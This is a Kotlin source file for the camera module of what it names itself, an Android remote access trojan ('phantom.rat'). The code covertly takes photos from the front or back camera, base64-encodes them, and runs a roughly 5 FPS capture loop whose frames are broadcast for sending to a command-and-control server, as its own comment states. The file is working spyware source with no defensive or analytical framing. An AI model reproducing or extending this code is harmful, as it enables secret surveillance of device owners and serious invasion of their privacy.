package com.phantom.rat.modules

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.Camera
import android.os.Environment
import android.view.SurfaceHolder
import android.view.SurfaceView
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import android.util.Base64

@Suppress("DEPRECATION")
class CameraModule(private val context: Context) {

    private var camera: Camera? = null
    private var isStreaming = false

    fun capturePhoto(facing: String): JSONObject {
        try {
            val cameraId = if (facing == "front") 
                getFrontCameraId() else getBackCameraId()
            if (cameraId == -1) throw Exception("Camera not found")
            
            camera = Camera.open(cameraId)
            val params = camera?.parameters
            params?.pictureFormat = android.graphics.ImageFormat.JPEG
            camera?.parameters = params
            camera?.startPreview()

            val result = JSONObject()
            camera?.takePicture(null, null) { data, _ ->
                try {
                    val file = File(Environment.getExternalStoragePublicDirectory(
                        Environment.DIRECTORY_DCIM), "IMG_${System.currentTimeMillis()}.jpg")
                    FileOutputStream(file).use { it.write(data) }
                    
                    val b64 = Base64.encodeToString(data, Base64.NO_WRAP)
                    result.put("status", "success")
                    result.put("path", file.absolutePath)
                    result.put("image_b64", b64)
                    result.put("size", data.size)
                } catch (e: Exception) {
                    result.put("status", "error")
                    result.put("message", e.message)
                }
                camera?.release()
                camera = null
            }
            
            Thread.sleep(1500)
            return result
        } catch (e: Exception) {
            camera?.release()
            camera = null
            return JSONObject().apply {
                put("status", "error")
                put("message", e.message)
            }
        }
    }

    fun startStream(facing: String): JSONObject {
        if (isStreaming) return JSONObject().apply {
            put("status", "error")
            put("message", "Already streaming")
        }
        isStreaming = true
        Thread {
            while (isStreaming) {
                try {
                    val result = capturePhoto(facing)
                    if (result.optString("status") == "success") {
                        // Send frame to C2
                        val frame = result.optString("image_b64", "")
                        if (frame.isNotEmpty()) {
                            // Broadcast frame
                            val intent = Intent("com.phantom.rat.CAMERA_FRAME")
                            intent.putExtra("frame", frame)
                            context.sendBroadcast(intent)
                        }
                    }
                    Thread.sleep(200) // ~5 FPS
                } catch (_: Exception) {}
            }
        }.start()
        return JSONObject().apply {
            put("status", "success")
            put("message", "Streaming started on $facing camera")
        }
    }

    fun stopStream(): JSONObject {
        isStreaming = false
        return JSONObject().apply {
            put("status", "success")
            put("message", "Streaming stopped")
        }
    }

    private fun getBackCameraId(): Int {
        for (i in 0 until Camera.getNumberOfCameras()) {
            val info = Camera.CameraInfo()
            Camera.getCameraInfo(i, info)
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) return i
        }
        return -1
    }

    private fun getFrontCameraId(): Int {
        for (i in 0 until Camera.getNumberOfCameras()) {
            val info = Camera.CameraInfo()
            Camera.getCameraInfo(i, info)
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i
        }
        return -1
    }
}
